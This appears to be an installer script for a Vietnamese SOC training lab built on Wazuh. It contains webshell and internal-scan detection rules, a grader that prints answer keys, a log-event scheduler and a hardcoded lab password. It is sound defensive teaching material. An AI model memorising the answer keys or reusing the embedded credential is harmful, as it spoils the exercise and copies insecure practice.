P3: seed18.py, lich-ca.py, shiftd.py, grade18.py, families/, bai18_prod_rules.xml
lib/ : ban chep labs/_shared/socq + soc-tools/{wzapi,replay}.py (chay labs/_shared/sync-soc-tools.sh soc-shift-capstone)
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/bai18_prod_rules.xml" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
<!-- Bai 18 - luat SAN XUAT (SV khong thay, khong sua). Dai 100310-100319. -->
<group name="bai18_prod,">
  <!-- Luat webshell "cu": chi bat tham so 'cmd=' -> lenh webshell cua C3 (ten tham so khac) KHONG no -->
  <rule id="100310" level="12">
    <if_sid>31100</if_sid>
    <url type="pcre2">[?&amp;]cmd=</url>
    <description>Webshell: goi lenh qua tham so cmd</description>
    <mitre><id>T1505.003</id></mitre>
  </rule>
</group>
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/grade18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# grade18.py - cham phia siem cua Bai 18 (root). Ba lenh:
#   rules [settle]  phat lai tap AN R-A/R-B tren luat DANG NAP -> /root/.bai18/rules.txt
#                   (grade-bai18.path goi khi local_rules.xml doi; doi analysisd khoi dong SAU lan sua cuoi)
#   live            doc alerts.json trong [T0, T0+90'] -> duong cong bao, C3_SEEN, C5_SEEN, moc R-A no that
#   print [--all]   (prestop) dap an theo THU TU PHAT (GT_*_k), moc phat tung ticket, rules.txt, live
#                   CHI SAU HET CA (truoc do: SHIFT_RUNNING); --all = phat trien
# Dap an chi nam trong output nay (SV khong doc duoc siem). Thu tu k = thu tu ticket da phat, giong het
# thu tu ma defender in (doc shift.json) -> goals.config so tung cap bang matchany + result._gt_* (D3).
# ============================================================================
import datetime, fcntl, hashlib, json, os, subprocess, sys, time
import xml.etree.ElementTree as ET

HERE = "/home/ubuntu/bai18"
sys.path.insert(0, os.path.join(HERE, "lib"))
import replay  # noqa: E402
from wzapi import Wazuh, WazuhError  # noqa: E402
from socq import families, shift  # noqa: E402

ST = "/root/.bai18"
PUB = "/srv/shiftd"
RULES = "/var/ossec/etc/rules/local_rules.xml"
ALERTS = "/var/ossec/logs/alerts/alerts.json"
TOOL_USER, TOOL_PASS = "soc-tool", "Soc.Tool.2026!"
RANGES = replay.parse_ranges(families.RANGES)          # ra, rb
RB_RECALL_GATE = 0.9
STORM_EXPECTED = 20          # canh bao R-B/phut khi bao CHUA xu ly (VM: 21-25) - moc 'giam 80%'


def canon(nums):
    """Tap so -> so nguyen duy nhat (giong bai18-thu-thap tren defender): 1 + moi so dem 0 thanh 5 chu so."""
    v = sorted({int(x) for x in nums if str(x).strip().isdigit()})
    return int("1" + "".join("%05d" % x for x in v)) if v else 0


def crc(text):
    import zlib
    return zlib.crc32((text or "").strip().lower().encode())


def write_atomic(path, text):
    open(path + ".tmp", "w").write(text)
    os.replace(path + ".tmp", path)


def rules_sha():
    try:
        return hashlib.sha256(open(RULES, "rb").read()).hexdigest()[:16]
    except OSError:
        return "none"


def static_check():
    """Dem luat level>=10 moi dai, MITRE; R-A 'trien khai' = co >=1 luat level>=10 trong dai R-A."""
    try:
        root = ET.fromstring("<root>" + open(RULES, encoding="utf-8").read() + "</root>")
    except (OSError, ET.ParseError):
        return False, {f: 0 for f in RANGES}
    ok, count = True, {f: 0 for f in RANGES}
    for r in root.iter("rule"):
        try:
            rid, lvl = int(r.get("id", "0")), int(r.get("level", "0"))
        except ValueError:
            continue
        for f, (lo, hi) in RANGES.items():
            if lo <= rid <= hi and lvl >= 10:
                count[f] += 1
                if r.find("mitre") is None:
                    ok = False
    return ok, count


def analysisd_started():
    try:
        pid = subprocess.run(["pidof", "wazuh-analysisd"], capture_output=True, text=True).stdout.split()[0]
        return os.stat("/proc/" + pid).st_ctime
    except (IndexError, OSError):
        return 0


def wait_rules_loaded(wait=300):
    t0 = time.time()
    while time.time() - t0 < wait:
        mt = os.path.getmtime(RULES) if os.path.exists(RULES) else 0
        st = analysisd_started()
        if st and st > mt:
            if time.time() - st < 30:
                time.sleep(10)
            return True
        time.sleep(5)
    return False


def do_rules(settle=20):
    lockf = open(os.path.join(ST, ".lock"), "w")
    fcntl.flock(lockf, fcntl.LOCK_EX)
    time.sleep(settle)
    wait_rules_loaded()
    record_history()
    out = ["RULES_SHA=%s" % rules_sha(), "GRADED_AT=%d" % int(time.time())]
    api = Wazuh("https://127.0.0.1:55000", TOOL_USER, TOOL_PASS)
    try:
        for i in range(24):
            try:
                api.login()
                break
            except WazuhError:
                if i == 23:
                    raise
                time.sleep(5)
        res = replay.run(replay.ApiEngine(api), replay.load_set(os.path.join(ST, "hidden.jsonl")), RANGES)
    except Exception as e:  # noqa: BLE001
        out.append("GRADE_ERROR=%s" % str(e)[:120].replace("\n", " "))
        write_atomic(os.path.join(ST, "rules.txt"), "\n".join(out) + "\n")
        return
    valid, count = static_check()
    out.append("RULES_VALID=%s" % ("Y" if valid else "N"))
    for f, r in res.items():
        u = f.upper()
        out.append("%s_TP=%d %s_FP=%d %s_FN=%d %s_NRULES=%d" % (u, r["tp"], u, r["fp"], u, r["fn"], u, count[f]))
        out.append("%s_P100=%d %s_R100=%d" % (u, round(100 * r["precision"]), u, round(100 * r["recall"])))
    rb = res.get("rb")
    if rb and rb["recall"] >= RB_RECALL_GATE and count["rb"] > 0:
        out.append("RB_NOT_BLIND")
    if count["ra"] > 0:
        out.append("RA_LOADED")
    write_atomic(os.path.join(ST, "rules.txt"), "\n".join(out) + "\n")


KHUNG = os.path.join(HERE, "local_rules_khung.xml")


def rb_signature(path):
    """Chuoi chuan hoa cua cac luat dai R-B (100340-100349) - de biet SV da sua R-B so voi khung chua."""
    try:
        root = ET.fromstring("<root>" + open(path, encoding="utf-8").read() + "</root>")
    except (OSError, ET.ParseError):
        return None
    sig = []
    for r in root.iter("rule"):
        try:
            rid = int(r.get("id", "0"))
        except ValueError:
            continue
        if 100340 <= rid <= 100349:
            sig.append(" ".join(ET.tostring(r, encoding="unicode").split()))
    return "|".join(sorted(sig))


def record_history():
    """Moi lan cham: ghi (mtime file luat, sha, R-B da sua?) - live dung de biet C5 co con THAY sau khi SV sua R-B."""
    try:
        # moc HIEU LUC = luc analysisd (da nap file nay) khoi dong; goi SAU wait_rules_loaded
        mt = int(max(os.path.getmtime(RULES), analysisd_started()))
    except OSError:
        return
    sha = rules_sha()
    p = os.path.join(ST, "rules-history")
    if os.path.exists(p) and any(l.split()[1] == sha for l in open(p) if len(l.split()) > 1):
        return
    rbmod = "Y" if rb_signature(RULES) != rb_signature(KHUNG) else "N"
    with open(p, "a") as f:
        f.write("%d %s RBMOD=%s RA=%s\n" % (mt, sha, rbmod, "Y" if ra_alert_rules(RULES) else "N"))


def ra_alert_rules(path):
    """So luat CANH BAO (level >= 10) trong dai R-A cua file luat."""
    try:
        root = ET.fromstring("<root>" + open(path, encoding="utf-8").read() + "</root>")
    except (OSError, ET.ParseError):
        return 0
    n = 0
    for r in root.iter("rule"):
        try:
            if 100330 <= int(r.get("id", "0")) <= 100339 and int(r.get("level", "0")) >= 10:
                n += 1
        except ValueError:
            pass
    return n


def first_ra_deploy():
    """Lan nap THANH CONG dau tien co luat canh bao dai R-A (quy uoc P5)."""
    p = os.path.join(ST, "rules-history")
    if not os.path.exists(p):
        return None
    ts = [int(l.split()[0]) for l in open(p) if " RA=Y" in l]
    return min(ts) if ts else None


def first_rb_fix():
    p = os.path.join(ST, "rules-history")
    if not os.path.exists(p):
        return None
    ts = [int(l.split()[0]) for l in open(p) if "RBMOD=Y" in l]
    return min(ts) if ts else None


def load_plan():
    return json.load(open(os.path.join(ST, "plan.json")))


def do_live():
    """Tu alerts.json: so canh bao dai R-B moi phut, phut khoanh vung bao (giam >= 80%), C3/C5 thay that."""
    st = shift.State(ST, PUB)
    t0 = st.t0()
    if not t0:
        return ["LIVE_ERROR=chua co T0"]
    plan = load_plan()
    at = {e["id"]: e["at"] for e in plan["events"]}
    end = t0 + at["END"]
    import socq.ca as ca  # noqa: E402
    seed = int(open(os.path.join(ST, "seed")).read())
    w = ca.build(seed, int(open(os.path.join(ST, "t_ref")).read()))["world"]
    ws_ip, att = w.ip("web-shop"), w.attacker_ip
    per_min, c3_first, c5_first = {}, None, None
    t_fix = first_rb_fix()          # C5 "con thay" chi co nghia SAU khi SV sua R-B (luat khung tu no da bat C5)
    try:
        f = open(ALERTS)
    except OSError:
        return ["LIVE_ERROR=khong doc duoc alerts.json"]
    for line in f:
        if '"1003' not in line:                  # loc nhanh: chi luat 1003xx
            continue
        try:
            a = json.loads(line)
        except ValueError:
            continue
        rid, lvl = int(a["rule"]["id"]), int(a["rule"]["level"])
        if lvl < 10:
            continue
        try:
            ts = datetime.datetime.strptime(a["timestamp"], "%Y-%m-%dT%H:%M:%S.%f%z").timestamp()
        except (KeyError, ValueError):
            continue
        if not (t0 <= ts <= end):
            continue
        data = a.get("data") or {}
        if 100340 <= rid <= 100349:
            m = int((ts - t0) // 60)
            per_min[m] = per_min.get(m, 0) + 1
            if data.get("srcip") == ws_ip and t_fix and ts >= t_fix and c5_first is None:
                c5_first = ts
        if 100330 <= rid <= 100339 and data.get("srcip") == att and w.webshell in (data.get("url") or ""):
            c3_first = c3_first or ts
    out = ["STORM_CURVE=%s" % ",".join("%d:%d" % kv for kv in sorted(per_min.items()))]
    m0 = int(at["R-B"] // 60)
    base = [per_min.get(m, 0) for m in range(m0, m0 + 3)]
    peak = max(base) if base else 0
    contain = None
    end_min = int(at["END"] // 60)
    # moc so sanh = max(dinh do duoc, toc do bao CHUA xu ly): SV sua R-B NGAY khi bao vua bat dau -> dinh
    # do duoc nho, khong duoc coi la "khong co bao" (gap tren VM 27/11: dinh 9, sua sau 26s)
    ref = max(peak, STORM_EXPECTED)
    for m in range(m0 + 1, end_min - 1):              # can 2 phut lien tiep TRUOC het ca
        if all(per_min.get(x, 0) <= 0.2 * ref for x in (m, m + 1)):
            contain = m
            break
    # phut THEO CA THAT (che do nhanh chia moc cho scale) -> nguong SOP 10'/20'/30' dung chung
    sc = float(plan.get("scale") or 1.0)
    mn = lambda sec: int(round(sec / 60.0 / sc))  # noqa: E731
    out.append("STORM_PEAK=%d" % peak)
    if contain is not None:
        out.append("RB_CONTAIN_MIN=%d" % round((contain - m0) / sc))
    if c3_first:
        out.append("C3_SEEN")
        out.append("C3_FIRST_MIN=%d" % mn(c3_first - t0))
    if t_fix:
        out.append("RB_FIX_MIN=%d" % mn(t_fix - t0))
        out.append("RB_FIX_REL=%d" % mn(t_fix - (t0 + at["R-B"])))
    t_ra = first_ra_deploy()
    if t_ra:
        out.append("RA_DEPLOY_REL=%d" % mn(t_ra - (t0 + at["R-A"])))
    if t_ra and t_ra <= end:
        out.append("GATE_RA_DEPLOYED")
    if c5_first:
        out.append("C5_SEEN")
    # siem tat giua ca (stoplab) -> luong that bi hong: khong tinh moc khoanh vung theo duong cong bao
    # LIVE_GAP = lich-ca khoi dong lai (siem tat/khoi dong lai) trong khoang [R-B, het ca]
    restarts, gap = 0, False
    try:
        base_day = time.mktime(time.localtime(t0)[:3] + (0, 0, 0, 0, 0, -1))
        for l in open(os.path.join(ST, "lich-ca.log")):
            if "bat dau: T0=%d " % t0 not in l:
                continue
            restarts += 1
            h, mi, se = (int(x) for x in l[:8].split(":"))
            ts = base_day + h * 3600 + mi * 60 + se
            if ts < t0 - 60:
                ts += 86400                                   # qua nua dem
            if restarts > 1 and t0 + at["R-B"] - 60 <= ts <= end + 60:
                gap = True
    except (OSError, ValueError):
        pass
    out.append("LICH_CA_RESTARTS=%d" % max(0, restarts - 1))
    if gap:
        out.append("LIVE_GAP")
    return out


def giu_cho():
    """Gia tri giu cho cho MOI result GROUP cua goals.config: Labtainers LOI grader neu result thieu
    (gap tren VM). 999999 khong bao gio trung bai lam (defender dung 999998 cho o bo trong)."""
    X = 999999
    for k in range(1, 14):
        print("GT_INC_%d=%d GT_V_%d=%d GT_P_%d=%d GT_E_%d=%d GT_ISP1_%d=%d" % (k, X, k, X, k, X, k, X, k, X))
    print("GT_SC_TK_C=%d GT_SC_HOST_C=%d GT_SC_HOSTIP_C=%d GT_SC_GIAI_DOAN=%d" % (X, X, X, X))
    print("GT_SC_T1=%d GT_SC_T2=%d GT_SC_T3=%d GT_SC_T4=%d" % (X, X, X, X))
    print("GT_SC_ASSET=%d GT_SC_STAGE=%d GT_SC_MITRE_C=%d GT_SC_IOC_C2=%d GT_SC_DE_XUAT_C=%d" % (X, X, X, X, X))


CACHE = os.path.join(ST, "print.cache")


def do_print(all_=False):
    print("SIEM18_MARKER")
    if not os.path.exists(os.path.join(ST, "seeded")):
        print("SEED_MISSING")
        return
    print(open(os.path.join(ST, "seeded")).read().strip())
    plan = load_plan()
    st = shift.State(ST, PUB)
    t0 = st.t0()
    dn = st.done()
    print("T0=%s" % t0)
    print("SHIFT_END=%s" % ("Y" if "END" in dn else "N"))
    if "END" not in dn and not all_:
        # TRONG CA: khong in dap an / ket qua tap an (checkwork giua ca KHONG duoc thanh "may do dap an")
        print("SHIFT_RUNNING")
        giu_cho()
        print("PRINT_DONE")
        return
    # dap an theo thu tu PHAT (k = 1..n); cung thu tu ma defender in
    rel = sorted([(dn[e["id"]], e["inc"]) for e in plan["events"] if e["kind"] == "ticket" and e["id"] in dn])
    for k, (ts, inc) in enumerate(sorted(rel, key=lambda x: (x[0], x[1])), 1):
        a = plan["answers"][inc]
        print("GT_INC_%d=%s REL_%d=%d" % (k, inc[4:], k, ts))
        print("GT_V_%d=%d GT_P_%d=%d GT_E_%d=%d GT_ISP1_%d=%d" % (k, a["V"], k, a["P"], k, a["E"], k, a["isp1"]))
    print("GT_N=%d" % len(rel))
    sc = plan["sc"]
    print("GT_SC_TICKETS=%s" % ",".join(t[4:] for t in sc["TICKETS"]))
    print("GT_SC_HOST=%s GT_SC_GIAI_DOAN=%d GT_SC_ASSET=%d GT_SC_IOC_C2=%d" % (sc["HOST"], sc["GIAI_DOAN"], sc["ASSET_LEVEL"], sc["IOC_C2"]))
    print("GT_SC_MITRE=%s GT_SC_DE_XUAT=%s" % (",".join(sc["MITRE"]), ",".join(str(x) for x in sc["DE_XUAT"])))
    # ma so nguyen chuan hoa (goals chi so integer_equal): tap so -> "1"+so dem 0 noi tiep ; ten may -> crc32
    import socq.ca as ca  # noqa: E402
    w = ca.build(int(open(os.path.join(ST, "seed")).read()), int(open(os.path.join(ST, "t_ref")).read()))["world"]
    print("GT_SC_TK_C=%d" % canon(t[4:] for t in sc["TICKETS"]))
    for i, t in enumerate(sc["TICKETS"], 1):
        print("GT_SC_T%d=%s" % (i, t[4:]))
    print("GT_SC_HOST_C=%d GT_SC_HOSTIP_C=%d" % (crc(sc["HOST"]), crc(w.ip(sc["HOST"]))))
    print("GT_SC_STAGE=%d" % {"A": 1, "B": 2, "C": 3}[sc["STAGE"]])
    print("GT_SC_MITRE_C=%d GT_SC_DE_XUAT_C=%d" % (canon(sc["MITRE"]), canon(sc["DE_XUAT"])))
    for k in ("R-A", "R-B"):
        if k in dn:
            print("REL_%s=%d" % (k.replace("-", ""), dn[k]))
    p = os.path.join(ST, "rules.txt")
    if os.path.exists(p):
        txt = open(p).read()
        print(txt.strip())
        if "RULES_SHA=%s" % rules_sha() not in txt:
            print("RULES_STALE")
    try:
        for line in do_live():
            print(line)
    except Exception as e:  # noqa: BLE001
        print("LIVE_ERROR=%s" % str(e)[:100].replace("\n", " "))
    print("PRINT_DONE")          # prestop chi tin ban in co dong nay (khong bi cat giua chung)


MAU_XML = """<group name="bai18,">
  <rule id="100330" level="12">
    <if_sid>31100</if_sid>
    <url type="pcre2">^/uploads/[^?]*\\.(php|phtml|phar)\\?</url>
    <description>R-A: goi script trong thu muc upload co tham so</description>
    <mitre><id>T1505.003</id></mitre>
  </rule>
  <rule id="100331" level="0">
    <if_sid>100330</if_sid>
    <url type="pcre2">^%(script)s\\?</url>
    <description>R-A ngoai le: script da duyet SVC-%(svc)s</description>
  </rule>
  <rule id="100342" level="1">
    <if_sid>4100</if_sid>
    <description>Su kien ket noi (dem cho R-B)</description>
  </rule>
  <rule id="100341" level="0">
    <if_sid>100342</if_sid>
    <list field="srcip" lookup="address_match_key">etc/lists/sao-luu-hosts</list>
    <list field="dstport" lookup="match_key">etc/lists/sao-luu-ports</list>
    <description>R-B ngoai le: agent sao luu CHG-%(chg)s (may nguon VA cong)</description>
  </rule>
  <rule id="100340" level="10" frequency="8" timeframe="120">
    <if_matched_sid>100342</if_matched_sid>
    <same_srcip />
    <different_dstip />
    <description>Mot may ket noi toi nhieu may noi bo trong thoi gian ngan</description>
    <mitre><id>T1046</id></mitre>
  </rule>
</group>
"""


def do_mau(install):
    """CHI DE PHAT TRIEN / P7: in (hoac cai) giai mau R-A/R-B cho the gioi cua SV nay. Chay bang root tren siem."""
    import socq.ca as ca  # noqa: E402
    seed = int(open(os.path.join(ST, "seed")).read())
    s = ca.build(seed, int(open(os.path.join(ST, "t_ref")).read()))
    w, cx = s["world"], s["ctx"]
    xml = MAU_XML % {"script": (w.upload_dir + w.approved_script).replace(".", "\\."), "svc": cx.svc_upload, "chg": cx.chg_backup}
    hosts = "".join("%s:\n" % w.ip(h) for h in w.backup_hosts)
    ports = "%d:\n" % w.backup_port
    if not install:
        print(xml + "\n# sao-luu-hosts\n" + hosts + "# sao-luu-ports\n" + ports)
        return
    open(RULES, "w").write(xml)
    open("/var/ossec/etc/lists/sao-luu-hosts", "w").write(hosts)
    open("/var/ossec/etc/lists/sao-luu-ports", "w").write(ports)
    os.system("chown wazuh:wazuh %s /var/ossec/etc/lists/sao-luu-*; /var/ossec/bin/wazuh-analysisd -t && /var/ossec/bin/wazuh-control restart >/dev/null && echo DA_NAP_GIAI_MAU" % RULES)


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "print"
    if cmd == "rules":
        do_rules(int(sys.argv[2]) if len(sys.argv) > 2 else 20)
    elif cmd in ("mau", "mau-nap"):
        do_mau(cmd == "mau-nap")
    elif cmd == "live":
        print("\n".join(do_live()))
    elif cmd == "cached":
        # prestop du phong (nhanh, khong indexer): ban in sau het ca do grade-bai18 luu; khong co -> giu cho
        if os.path.exists(CACHE):
            sys.stdout.write(open(CACHE).read())
            print("FROM_CACHE")
        else:
            print("SIEM18_MARKER")
            print("PRESTOP_FALLBACK")
            giu_cho()
    elif "--cache" in sys.argv:
        # grade-bai18 (sau moi lan cham + sau het ca): luu ban in cho prestop du phong
        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            do_print()
        if "SHIFT_END=Y" in buf.getvalue():
            write_atomic(CACHE, buf.getvalue())
    else:
        do_print("--all" in sys.argv)          # --all: CHI phat trien (in ca khi chua het ca)
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/lich-ca.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# lich-ca.py - bo lap lich ca truc Bai 18 (systemd lich-ca.service, root, Restart=always).
# Doc seed + t_ref + T0 tu /root/.bai18, dung lai ca bang socq.ca.build, roi phat theo T0:
#   - su kien MOT LAN (ticket, yeu cau R-A, bao R-B, nhac gio, het ca): nhat ky events.log -> bu khi khoi dong lai
#   - LUONG lien tuc (moi TICK giay): web hop le, lenh webshell (sau C3), bao (sau R-B), quet C5 (C5..C5_END)
#     -> ghi dong log vao /var/log/soc-shift/*.log (manager doc bang <localfile>, luat SV no truc tiep)
#     -> luong KHONG bu khi khoi dong lai (chi chay tiep tu tick hien tai)
#   - shift.json (khong dap an) cho shiftd/defender moi vong lap
# Che do nhanh (phat trien): echo 0.1667 > /root/.bai18/scale  (1 ca = 15'). XOA truoc khi phat hanh.
# ============================================================================
import json, os, subprocess, random, shutil, sys, time

HERE = "/home/ubuntu/bai18"
sys.path.insert(0, os.path.join(HERE, "lib"))
from socq import ca, cases, chain, docs, indexer, shift  # noqa: E402

ST = "/root/.bai18"
PUB = "/srv/shiftd"
LOGDIR = "/var/log/soc-shift"
TICK = 10
# Bao: ~26 dong/10s tu 2-3 may sao luu -> ~20-30 canh bao 100340/phut voi luat khung (kich ban: 150-300 / 10 phut).
# Lan chay nhanh dau tien voi 6 dong/tick chi ra 4-7 canh bao/phut (qua nhe, khong thanh "bao").
STORM_PER_TICK = 26
SCAN_PER_TICK = 3
LOG = os.path.join(ST, "lich-ca.log")

YC_RA = """YÊU CẦU LUẬT KHẨN — R-A (từ IR, {gio})

Kẻ tấn công đang gọi lệnh qua webshell trên web-shop; tên tham số đổi liên tục nên luật
webshell hiện tại (chỉ bắt "cmd=") không nổ.

Cần: luật bắt MỌI lệnh gọi qua script trong thư mục upload ({up}), KHÔNG phụ thuộc tên tham số.
Dải ID: 100330–100339. Level ≥ 10, có <mitre>. Không báo động giả trên script đã duyệt
(xem danh mục dịch vụ trong ctx-*).
Hạn: {han} phút kể từ giờ trên. Triển khai bản "đủ tốt" trước, tinh chỉnh sau.

Tập phát triển có nhãn: dev.jsonl (cùng thư mục). Kiểm thử: kiem-thu-luat (và thu-dong "<dòng log>")
"""
YC_RB = """BÃO CẢNH BÁO — R-B ({gio})

Trưởng ca: "Dashboard đang ngập luật 100340 (một máy kết nối tới nhiều máy nội bộ).
Xử lý đi, nhưng ĐỪNG ĐỂ MÙ."

Luật nằm trong ~/luat/local_rules.xml (100342 + 100340), dải 100340–100349.
SOP 7: CẤM tắt luật hoặc hạ xuống dưới mức cảnh báo. Ngoại lệ phải có căn cứ (phiếu thay đổi trong ctx-*).
Hạn khoanh vùng: {han} phút kể từ giờ trên.

Tập phát triển có nhãn: dev.jsonl (cùng thư mục). Kiểm thử: kiem-thu-luat (và thu-dong "<dòng log>")
"""


def log(msg):
    with open(LOG, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))


def append(name, lines):
    if not lines:
        return
    with open(os.path.join(LOGDIR, name), "a") as f:
        f.write("\n".join(lines) + "\n")


def canh_bao(ex):
    """Loi indexer ma SV can biet (dia day -> index chi doc): /srv/shiftd/canh-bao.json cho trang-thai."""
    p = os.path.join(PUB, "canh-bao.json")
    msg = str(ex or "")
    if ex is None:
        if os.path.exists(p):
            os.remove(p)
        return
    if "flood-stage" in msg or "read_only" in msg or "disk usage" in msg:
        open(p, "w").write(json.dumps({"loi": "DIA_DAY", "t": int(time.time())}))


def release_request(key, dev, text):
    d = os.path.join(PUB, "yeu-cau", key)
    os.makedirs(d, exist_ok=True)
    shutil.copy(os.path.join(ST, dev), os.path.join(d, "dev.jsonl"))
    open(os.path.join(d, "yeu-cau.txt"), "w").write(text)


def main():
    while not (os.path.exists(os.path.join(ST, "T0")) and os.path.exists(os.path.join(ST, "seed"))):
        time.sleep(5)
    seed = int(open(os.path.join(ST, "seed")).read())
    t_ref = int(open(os.path.join(ST, "t_ref")).read())
    # che do nhanh: /root/.bai18/scale (tao TRUOC khi seed xong) hoac file 'scale' trong thu muc lab bai18/
    # (chi khi phat trien - XOA truoc khi phat hanh)
    sc_file = next((p for p in (os.path.join(ST, "scale"), os.path.join(HERE, "scale")) if os.path.exists(p)), None)
    scale = float(open(sc_file).read()) if sc_file else 1.0
    s = ca.build(seed, t_ref, scale=scale)
    s["scale"] = scale
    w, events = s["world"], s["events"]
    # plan.json theo DUNG lich dang chay (che do nhanh doi moc) - grade18 doc file nay
    json.dump({"answers": s["answers"], "sc": s["sc"], "events": events, "scale": scale},
              open(os.path.join(ST, "plan.json"), "w"), indent=1)
    st = shift.State(ST, PUB)
    t0 = st.t0()
    at = {e["id"]: e["at"] for e in events}
    end = t0 + at["END"]
    ix = indexer.Indexer()
    # lich lenh webshell (sau C3, moi 3-5 phut) - co dinh theo seed
    r = random.Random("%s:c3" % seed)
    c3 = []
    t = at["C3"]
    while t < at["END"]:
        c3.append(t)
        t += int(r.randint(180, 300) * scale)
    log("bat dau: T0=%d scale=%s, %d su kien, %d lan lenh webshell" % (t0, scale, len(events), len(c3)))
    last_tick = None
    while True:
        now = time.time()
        if st.t0() != t0:          # reset-ca (phat trien) doi/xoa T0 -> thoat; systemd chay lai, doc T0 moi
            log("T0 doi (%s -> %s) -> khoi dong lai" % (t0, st.t0()))
            return
        done = st.done()
        # ---- su kien mot lan (bu neu qua gio)
        for e in shift.due(events, t0, done, now):
            try:
                handle(e, s, st, ix, t0, now, seed)
                st.mark(e["id"])
                canh_bao(None)
                log("phat %s (%s) tre %ds" % (e["id"], e.get("inc", e["kind"]), now - t0 - e["at"]))
            except Exception as ex:  # noqa: BLE001
                log("LOI phat %s: %r" % (e["id"], ex))
                canh_bao(ex)
        # ---- luong lien tuc
        if t0 <= now < end:
            tick = int((now - t0) // TICK)
            if tick != last_tick:
                last_tick = tick
                rel = now - t0
                rng = random.Random("%s:tick:%d" % (seed, tick))
                web = chain.lines_web_noise(now, w, rng, 3)
                if any(c <= rel < c + TICK for c in c3):
                    web += chain.lines_webshell_cmd(now, w, rng)
                append("web-shop.log", web)
                net = []
                if rel >= at["R-B"]:
                    net += chain.lines_storm(now, w, rng, STORM_PER_TICK)
                if at["C5"] <= rel < at["C5_END"]:
                    net += chain.lines_scan(now, w, rng, SCAN_PER_TICK)
                append("net.log", net)
        st.publish(events, {"scale": scale})
        if now >= end + 60 and "END" in st.done():
            # het ca: chi giu shift.json cap nhat (defender doc 'end'); ngu dai
            time.sleep(30)
        else:
            time.sleep(2)


def handle(e, s, st, ix, t0, now, seed):
    w = s["world"]
    han = max(1, int(round(20 * s.get("scale", 1.0))))     # han yeu cau (phut) theo scale
    k = e["kind"]
    if k == "ticket":
        p = s["plans"][e["id"]]
        rng = ca.event_rng(seed, e["id"])
        ts = now
        if e.get("backlog"):
            ts = t0 - rng.randint(90, 150) * 60           # ticket ton tu ca chieu
        if e["id"].startswith("C"):
            tk, ev = chain.render(e["id"], p, ts, w, rng)
        else:
            tk, ev = cases.render(p, ts, w, rng)
        tk = docs.ticket(tk, e["inc"])
        ix.bulk([(docs.index_name(ts), d) for d in ev] + [(docs.index_name(ts), tk)], refresh=True)
    elif k == "request":
        release_request("R-A", "dev-ra.jsonl", YC_RA.format(gio=time.strftime("%H:%M"), up=w.upload_dir, han=han))
    elif k == "storm_start":
        release_request("R-B", "dev-rb.jsonl", YC_RB.format(gio=time.strftime("%H:%M"), han=han))
    elif k == "end":
        open(os.path.join(ST, "SHIFT_END"), "w").write("%d\n" % int(now))
        # cham + luu ban in sau het ca (prestop du phong neu prestop qua 30s)
        subprocess.run(["systemctl", "start", "--no-block", "grade-bai18.service"])


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/local_rules_khung.xml" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
<!--
  ~/luat/local_rules.xml - Bai 18. Luat CUA BAN, nap bang:  sudo kiem-thu-luat
  Dai ID:  R-A 100330-100339  |  R-B 100340-100349
  Luat canh bao: level >= 10 va co <mitre>. Ngoai le: luat con level 0, dua tren truong + danh muc co can cu.
  Truong TINH (srcip, dstip, dstport, url, id) dung the rieng (<srcip>, <dstport>, <url>...), KHONG dung <field name="...">.
-->
<group name="bai18,">

  <!-- R-B (dang chay tren san xuat): moi su kien ket noi (netfilter) -> dem. Level 1: khong ghi alerts.json
       nhung VAN dem duoc (Wazuh khong dem tan suat tren luat level 0 nhu 4100). -->
  <rule id="100342" level="1">
    <if_sid>4100</if_sid>
    <description>Su kien ket noi (dem cho R-B)</description>
  </rule>

  <!-- R-B: mot may ket noi toi nhieu dich noi bo trong thoi gian ngan -->
  <rule id="100340" level="10" frequency="8" timeframe="120">
    <if_matched_sid>100342</if_matched_sid>
    <same_srcip />
    <different_dstip />
    <description>Mot may ket noi toi nhieu may noi bo trong thoi gian ngan</description>
    <mitre><id>T1046</id></mitre>
  </rule>

</group>
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/reset-ca.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# reset-ca.py - CHI DE PHAT TRIEN/THU NGHIEM Bai 18 (khong noi trong read_first).
# Bat dau lai ca truc ma KHONG rebuild/restart lab:
#   docker exec soc-shift-capstone.siem.student python3 /home/ubuntu/bai18/reset-ca.py [--giu-luat]
# Lam gi (tren siem, root):
#   1) indexer: xoa (chay nen) ticket + moi doc tu (T0 cu - 20') den BAY GIO -> tranh ticket trung INC
#   2) dung lich-ca; xoa events.log, SHIFT_END, rules-history, rules.txt; T0 GHI DE (khong bao gio xoa)
#   3) /srv/shiftd: xoa shift.json va yeu-cau/  (defender thay t0 doi -> watcher tu lam moi phia defender)
#   4) nap lai luat KHUNG (tru khi --giu-luat) + restart manager -> bao R-B xuat hien lai
#   5) dat T0 = bay gio, chay lai lich-ca + cham lan dau
# Han che: nen 3h truoc T0 cu bi xoa mot phan; alerts.json van giu dong cua ca cu (live chi doc [T0 moi, het ca]).
# ============================================================================
import os, shutil, subprocess, sys, time

HERE = "/home/ubuntu/bai18"
sys.path.insert(0, os.path.join(HERE, "lib"))
sys.path.insert(0, HERE)
from socq import indexer, shift  # noqa: E402

ST, PUB = "/root/.bai18", "/srv/shiftd"


def sh(c):
    print("+ " + c)
    return subprocess.run(c, shell=True).returncode


def main():
    if os.geteuid() != 0:
        raise SystemExit("can root: docker exec <siem> python3 %s" % sys.argv[0])
    st = shift.State(ST, PUB)
    old = st.t0()
